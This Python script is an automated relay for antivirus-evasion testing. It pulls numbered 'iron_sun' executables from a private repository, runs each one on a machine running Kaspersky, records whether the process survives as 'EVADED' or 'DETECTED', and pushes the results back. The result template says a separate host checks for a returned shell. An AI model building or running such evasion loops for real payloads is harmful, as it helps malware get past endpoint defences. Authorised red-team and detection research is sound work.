#!/usr/bin/env python3
"""
GWU07 RELAY - iron-sun test agent (gwu07 side)

Run this on gwu07 (the Kaspersky machine).
It watches rainfantry/iron-sun for new payloads from RADON,
tests each one against Kaspersky, and pushes results back.

Setup on gwu07 (one time):
  git clone git@github.com:rainfantry/iron-sun.git C:\\Users\\<you>\\Desktop\\iron-sun
  cd C:\\Users\\<you>\\Desktop\\iron-sun
  python gwu07_relay.py

If iron-sun is NOT cloned yet, this script clones it automatically.
Requires: git with SSH access to rainfantry/iron-sun

Communication channel: rainfantry/iron-sun (private)
  Reads:   payloads/iron_sun_v<N>.exe
           docs/RELAY/PAYLOAD_v<N>.md
  Writes:  docs/RELAY/RESULT_v<N>.md
           GWU07_RELAY_LOG.md
"""
import os, sys, subprocess, hashlib, time, datetime, re, shutil

# ── CONFIG ──────────────────────────────────────────────────────────────
# iron-sun clone directory on gwu07
# Script auto-detects: same dir as this script, OR default below
_script_dir = os.path.dirname(os.path.abspath(__file__))
if os.path.exists(os.path.join(_script_dir, ".git")):
    IRON_SUN_DIR = _script_dir
else:
    # Default clone location
    IRON_SUN_DIR = os.path.join(os.path.expanduser("~"), "Desktop", "iron-sun")

IRON_SUN_REMOTE = "git@github.com:rainfantry/iron-sun.git"
RELAY_DIR        = os.path.join(IRON_SUN_DIR, "docs", "RELAY")
PAYLOADS_DIR     = os.path.join(IRON_SUN_DIR, "payloads")
LOG_FILE         = os.path.join(IRON_SUN_DIR, "GWU07_RELAY_LOG.md")
POLL_SECS        = 30    # how often to check for new payloads
EXEC_WAIT_SECS   = 18   # seconds to wait after launching binary

# ── HELPERS ─────────────────────────────────────────────────────────────

def ts():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def log(msg):
    line = f"[{ts()}] {msg}"
    print(line)
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(line + "\n")

def sha256_file(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            h.update(chunk)
    return h.hexdigest()

def git(*args):
    r = subprocess.run(["git"] + list(args), cwd=IRON_SUN_DIR,
                       capture_output=True, text=True)
    return r.returncode == 0, r.stdout.strip(), r.stderr.strip()

# ── REPO MANAGEMENT ──────────────────────────────────────────────────────

def ensure_repo():
    if not os.path.exists(os.path.join(IRON_SUN_DIR, ".git")):
        log(f"Cloning rainfantry/iron-sun to {IRON_SUN_DIR} ...")
        os.makedirs(IRON_SUN_DIR, exist_ok=True)
        r = subprocess.run(
            ["git", "clone", IRON_SUN_REMOTE, IRON_SUN_DIR],
            capture_output=True, text=True
        )
        if r.returncode != 0:
            log(f"Clone FAILED: {r.stderr}")
            sys.exit(1)
        log("Clone OK")
    else:
        ok, _, err = git("pull")
        if not ok:
            log(f"pull warn: {err}")

def pull_latest():
    ok, out, err = git("pull")
    if not ok:
        log(f"pull warn: {err}")
    return ok

# ── PAYLOAD DISCOVERY ────────────────────────────────────────────────────

def get_tested_versions():
    tested = set()
    if not os.path.exists(RELAY_DIR):
        return tested
    for f in os.listdir(RELAY_DIR):
        m = re.match(r'RESULT_v(\d+)\.md', f)
        if m:
            tested.add(int(m.group(1)))
    return tested

def get_pending_payloads(tested):
    pending = []
    if not os.path.exists(RELAY_DIR):
        return pending
    for f in sorted(os.listdir(RELAY_DIR)):
        m = re.match(r'PAYLOAD_v(\d+)\.md', f)
        if not m:
            continue
        v = int(m.group(1))
        if v in tested:
            continue
        binary = os.path.join(PAYLOADS_DIR, f"iron_sun_v{v}.exe")
        if not os.path.exists(binary):
            log(f"  Manifest v{v} found but binary missing — skipping (pull may be incomplete)")
            continue
        pending.append((v, os.path.join(RELAY_DIR, f), binary))
    return pending

# ── KASPERSKY CHECK ──────────────────────────────────────────────────────

def kaspersky_procs():
    r = subprocess.run(["tasklist", "/fo", "csv", "/nh"],
                       capture_output=True, text=True)
    out = r.stdout.lower()
    targets = ["avpui.exe", "avp.exe", "ksde.exe", "kavtray.exe",
               "klnagent.exe", "ksc.exe", "avpsus.exe"]
    found = [p for p in targets if p in out]
    return found

def process_alive(pid):
    r = subprocess.run(
        ["tasklist", "/fo", "csv", "/fi", f"PID eq {pid}"],
        capture_output=True, text=True
    )
    return str(pid) in r.stdout

# ── PAYLOAD TEST ─────────────────────────────────────────────────────────

def run_test(version, binary_path):
    """
    Launch iron_sun_v<N>.exe, wait EXEC_WAIT_SECS, check if still running.
    Returns: (process_survived, kaspersky_caught, notes_list)
    """
    notes = []
    binary_hash = sha256_file(binary_path)
    notes.append(f"Binary: {os.path.basename(binary_path)}")
    notes.append(f"SHA256: {binary_hash}")

    # Kaspersky presence check
    kav = kaspersky_procs()
    if kav:
        notes.append(f"Kaspersky active: {', '.join(kav)}")
        log(f"  Kaspersky confirmed: {', '.join(kav)}")
    else:
        notes.append("WARNING: No Kaspersky process detected — test invalid")
        log("  WARNING: Kaspersky not running")

    # Launch binary
    log(f"  Launching {binary_path}")
    try:
        proc = subprocess.Popen(
            [binary_path],
            creationflags=0x00000010,   # CREATE_NEW_CONSOLE
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True
        )
        pid = proc.pid
        notes.append(f"Launched PID: {pid}")
        log(f"  PID {pid} launched")
    except PermissionError:
        notes.append("Launch FAILED: PermissionError (Kaspersky blocked execution)")
        log("  PermissionError on launch — Kaspersky blocked binary before exec")
        return False, True, notes
    except Exception as e:
        notes.append(f"Launch FAILED: {e}")
        log(f"  Launch exception: {e}")
        return False, True, notes

    # Wait for Kaspersky to react
    log(f"  Waiting {EXEC_WAIT_SECS}s ...")
    time.sleep(EXEC_WAIT_SECS)

    # Check survival
    survived = process_alive(pid)

    if survived:
        notes.append("PROCESS: SURVIVED")
        log(f"  PID {pid} still running after {EXEC_WAIT_SECS}s — Kaspersky did not kill")
        try:
            proc.terminate()
        except Exception:
            pass
    else:
        notes.append("PROCESS: KILLED")
        log(f"  PID {pid} gone — Kaspersky killed/quarantined binary")

    kaspersky_caught = not survived
    return survived, kaspersky_caught, notes

# ── RESULT WRITE ─────────────────────────────────────────────────────────

def write_result(version, survived, caught, notes):
    os.makedirs(RELAY_DIR, exist_ok=True)
    path = os.path.join(RELAY_DIR, f"RESULT_v{version}.md")

    if survived and not caught:
        verdict = "EVADED"
    elif not survived:
        verdict = "DETECTED"
    else:
        verdict = "PARTIAL"

    notes_text = "\n".join(f"- {n}" for n in notes)

    content = f"""# RELAY RESULT v{version}

**Tested:** {ts()}
**Tester:** gwu07
**VERDICT: {verdict}**

## Process Check
- PROCESS: {"SURVIVED" if survived else "KILLED"}
- Kaspersky: {"CAUGHT" if caught else "DID NOT CATCH"}
- Connection to RADON: verified by RADON listener (see RELAY_LOG.md)

## Notes
{notes_text}

## Verdict
{"Binary executed and stayed alive for the full window — execution-layer evasion confirmed." if survived else "Binary was terminated before the window elapsed — Kaspersky detected and quarantined it."}
RADON will verify whether a TCP connection/shell was received.
"""
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    log(f"  Result written: docs/RELAY/RESULT_v{version}.md")
    return path

def push_result(version, result_path):
    rel_result = os.path.relpath(result_path, IRON_SUN_DIR).replace("\\", "/")
    rel_log    = os.path.relpath(LOG_FILE, IRON_SUN_DIR).replace("\\", "/")
    git("add", rel_result, rel_log)
    ok, _, err = git("commit", "-m", f"relay: gwu07 result v{version} [{ts()}]")
    if not ok and "nothing to commit" not in err:
        log(f"  commit warn: {err}")
    ok, _, err = git("push")
    if ok:
        log(f"  pushed result v{version} to iron-sun")
    else:
        log(f"  push ERROR: {err}")
        log(f"  Hint: git remote -v to check remote, git push -u origin main if needed")
    return ok

# ── MAIN LOOP ────────────────────────────────────────────────────────────

def relay_loop():
    if not os.path.exists(LOG_FILE):
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.write("# GWU07 RELAY LOG\n\n")

    log("=" * 60)
    log("GWU07 RELAY STARTED")
    log(f"iron-sun dir: {IRON_SUN_DIR}")
    log(f"Poll interval: {POLL_SECS}s")
    log("=" * 60)

    ensure_repo()

    while True:
        try:
            pull_latest()

            tested  = get_tested_versions()
            pending = get_pending_payloads(tested)

            if not pending:
                log(f"No pending payloads — waiting {POLL_SECS}s")
            else:
                for version, manifest_path, binary_path in pending:
                    log(f"\n--- TESTING v{version}: {binary_path} ---")
                    survived, caught, notes = run_test(version, binary_path)
                    result_path = write_result(version, survived, caught, notes)
                    push_result(version, result_path)
                    log(f"--- v{version} DONE: survived={survived} caught={caught} ---\n")

        except KeyboardInterrupt:
            log("GWU07 RELAY stopped by user (Ctrl+C)")
            break
        except Exception as e:
            log(f"ERROR in loop: {e}")

        time.sleep(POLL_SECS)

if __name__ == "__main__":
    relay_loop()
